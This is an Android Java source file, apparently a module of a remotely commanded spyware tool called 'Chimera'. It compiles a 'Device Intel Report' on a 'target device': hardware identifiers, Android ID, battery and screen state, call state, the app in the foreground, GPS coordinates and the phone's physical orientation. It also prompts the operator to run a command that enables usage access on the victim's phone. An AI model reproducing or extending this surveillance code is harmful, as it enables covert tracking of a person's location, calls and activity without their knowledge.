package com.chimera;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AppOpsManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import androidx.core.app.ActivityCompat;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.Task;
import java.util.List;
import java.util.SortedMap;
import java.util.TreeMap;

public class DeviceDetailsHelper {

    public interface DetailsCallback { void onDetailsReady(String details); }

    public static void getDeviceDetails(Context context, DetailsCallback callback) {
        if (!hasUsageStatsPermission(context)) {
            String msg = "Foreground App detection requires 'Usage Access' permission.\n\n"
                       + "Please run the `/grant_usage_access` command to open the required settings page on the target device and enable the permission for this app.";
            callback.onDetailsReady(msg);
            return;
        }
        StringBuilder details = new StringBuilder();
        details.append("`Chimera Device Intel Report`\n`====================`\n\n");
        details.append("*--- Device Info ---*\n");
        details.append("`Manufacturer:` ").append(Build.MANUFACTURER).append("\n");
        details.append("`Model:       ` ").append(Build.MODEL).append("\n");
        details.append("`Android Ver: ` ").append(Build.VERSION.RELEASE).append(" (SDK ").append(Build.VERSION.SDK_INT).append(")\n");
        details.append("`Android ID:  ` ").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)).append("\n\n");
        details.append("*--- Status ---*\n");
        details.append(getBatteryInfo(context));
        details.append(getScreenState(context));
        details.append(getCallState(context));
        details.append(getForegroundApp(context)).append("\n");
        getSensorAndLocationInfo(context, sensorInfo -> {
            details.append(sensorInfo);
            callback.onDetailsReady(details.toString());
        });
    }

    private static boolean hasUsageStatsPermission(Context context) {
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private static String getBatteryInfo(Context context) {
        Intent batteryStatus = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (batteryStatus == null) return "`Battery Info: ` Not Available\n";
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        float batteryPct = level * 100 / (float) scale;
        String statusStr = "Discharging";
        if (status == BatteryManager.BATTERY_STATUS_CHARGING) statusStr = "Charging";
        if (status == BatteryManager.BATTERY_STATUS_FULL) statusStr = "Full";
        return "`Battery:     ` " + (int) batteryPct + "% (" + statusStr + ")\n";
    }

    private static String getScreenState(Context context) {
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        return "`Screen State:` " + (pm.isInteractive() ? "ON" : "OFF") + "\n";
    }

    private static String getCallState(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) return "`Call State:  ` Permission Denied\n";
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String state = "Idle";
        if (tm.getCallState() == TelephonyManager.CALL_STATE_RINGING) state = "Ringing";
        if (tm.getCallState() == TelephonyManager.CALL_STATE_OFFHOOK) state = "On Call";
        return "`Call State:  ` " + state + "\n";
    }

    private static String getForegroundApp(Context context) {
        String currentApp = "Unknown";
        UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        long time = System.currentTimeMillis();
        List<UsageStats> appList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 60 * 1000, time);
        if (appList != null && !appList.isEmpty()) {
            SortedMap<Long, UsageStats> sortedMap = new TreeMap<>();
            for (UsageStats usageStats : appList) sortedMap.put(usageStats.getLastTimeUsed(), usageStats);
            if (!sortedMap.isEmpty()) currentApp = sortedMap.get(sortedMap.lastKey()).getPackageName();
        }
        return "`Foreground App: ` " + currentApp;
    }

    @SuppressLint("MissingPermission")
    private static void getSensorAndLocationInfo(Context context, DetailsCallback callback) {
        StringBuilder sensorDetails = new StringBuilder();
        FusedLocationProviderClient locationClient = LocationServices.getFusedLocationProviderClient(context);
        locationClient.getLastLocation().addOnCompleteListener(task -> {
            sensorDetails.append("*--- Location ---*\n");
            if (task.isSuccessful() && task.getResult() != null) {
                Location loc = task.getResult();
                sensorDetails.append("`Lat/Lon: ` ").append(loc.getLatitude()).append(", ").append(loc.getLongitude()).append("\n");
                sensorDetails.append("`Accuracy:` ").append(loc.getAccuracy()).append(" meters\n\n");
            } else {
                sensorDetails.append("`Location:` Not Available or Permission Denied\n\n");
            }
            analyzeSensors(context, sensorAnalysis -> {
                sensorDetails.append(sensorAnalysis);
                callback.onDetailsReady(sensorDetails.toString());
            });
        });
    }

    private static void analyzeSensors(Context context, DetailsCallback callback) {
        SensorManager sm = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
        Sensor accelerometer = sm.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        Sensor magnetometer = sm.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);
        StringBuilder analysis = new StringBuilder("*--- Sensor Analysis ---*\n");
        if (accelerometer == null || magnetometer == null) {
            analysis.append("Orientation sensors not available.\n");
            callback.onDetailsReady(analysis.toString());
            return;
        }
        final float[][] sensorData = new float[2][];
        SensorEventListener listener = new SensorEventListener() {
            @Override public void onSensorChanged(SensorEvent event) {
                if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) sensorData[0] = event.values.clone();
                if (event.sensor.getType() == Sensor.TYPE_MAGNETIC_FIELD) sensorData[1] = event.values.clone();
            }
            @Override public void onAccuracyChanged(Sensor s, int a) {}
        };
        sm.registerListener(listener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
        sm.registerListener(listener, magnetometer, SensorManager.SENSOR_DELAY_NORMAL);
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            sm.unregisterListener(listener);
            if (sensorData[0] != null) {
                float x = sensorData[0][0], y = sensorData[0][1], z = sensorData[0][2];
                if (Math.abs(z) > 9.0) analysis.append("`Position:  ` Lying flat, screen ").append(z > 0 ? "UP." : "DOWN.").append("\n");
                else if (Math.abs(y) > 9.0) analysis.append("`Position:  ` Upright (Portrait).\n");
                else if (Math.abs(x) > 9.0) analysis.append("`Position:  ` On its side (Landscape).\n");
                else analysis.append("`Position:  ` Held at an angle.\n");
            }
            if (sensorData[0] != null && sensorData[1] != null) {
                float[] R = new float[9];
                if (SensorManager.getRotationMatrix(R, null, sensorData[0], sensorData[1])) {
                    float[] orientation = new float[3];
                    SensorManager.getOrientation(R, orientation);
                    float azimuth = (float) Math.toDegrees(orientation[0]);
                    if (azimuth < 0) azimuth += 360;
                    String direction = "N";
                    if (azimuth >= 337.5 || azimuth < 22.5) direction = "North"; else if (azimuth < 67.5) direction = "NE";
                    else if (azimuth < 112.5) direction = "East"; else if (azimuth < 157.5) direction = "SE";
                    else if (azimuth < 202.5) direction = "South"; else if (azimuth < 247.5) direction = "SW";
                    else if (azimuth < 292.5) direction = "West"; else if (azimuth < 337.5) direction = "NW";
                    analysis.append("`Direction: ` Top of device pointing ").append(direction).append(" (").append((int)azimuth).append("°).\n");
                }
            }
            callback.onDetailsReady(analysis.toString());
        }, 1500);
    }
}